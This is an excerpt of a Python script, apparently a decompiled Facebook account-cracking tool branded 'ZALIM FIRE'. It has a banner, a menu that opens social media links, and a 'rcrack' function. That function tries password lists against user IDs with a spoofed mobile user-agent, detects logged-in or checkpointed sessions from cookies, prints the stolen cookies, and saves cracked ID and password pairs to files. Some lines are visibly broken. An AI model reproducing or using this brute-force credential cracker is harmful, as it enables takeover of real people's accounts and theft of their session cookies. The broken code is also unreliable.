...
def FD():
    os.system('clear')
    print(logo)
    print('\x1b[1;33m [1] https://chat.whatsapp.com/Bi1kRyhGIQo9awLaY3gCOr')
    print(' [2] EXIT')
    opt = input('\n  \x1b[1;32m Choose option >>> ')
    if opt == '1':
        os.system('xdg-open https://youtu.be/y88837qD_AO6Q')
        o()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')
...
def o():
    ...
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100022095802717&mibextid=haYZDX')
        return None
    if None == '3':
        os.system('xdg-open https://youtube.com/channel/UCG8CSxk8KQMZuVfRhCa6FBw')
        return None
    if None == '4':
        os.system('xdg-open https://facebook.com/groups/436750425006976/')
        return None
    if None == '0':
        os.system('exit')
        return None
...
\033[1;97m #      #     # #        #  #     # 
\033[1;97m####### #     # ####### ### #     # 
\033[1;37m================= \33[32;45mZALIM FIRE\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mZALIM \33[0;m\033[1;32m && \033[1;33mSAMI \33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m MOHAMMAD SHAHID
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mTEAM-ZALIM
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m     \033[1;35mTEAM         :  \033[1;35mNO 
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m0.5
\033[1;37m================= \33[32;45mINDIA \33[0;m =====================
 
       \33[37;41m\t WELLCOME TO ZALIM TOOL\33[0;m
 
\033[1;37m================== \33[32;45mCYBER\33[0;m ======================\n""")
loop = 0
oks = []
cps = []
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'user-agent': 'Mozilla/5.0 (Linux; Android 9; CPH1907 Build/PKQ1.190630.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 GNews Android/2022150848',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(ZALIM-OK🔥)  ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/ZALIM-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(ZALIM-CP🤕)  ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/ZALIM-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
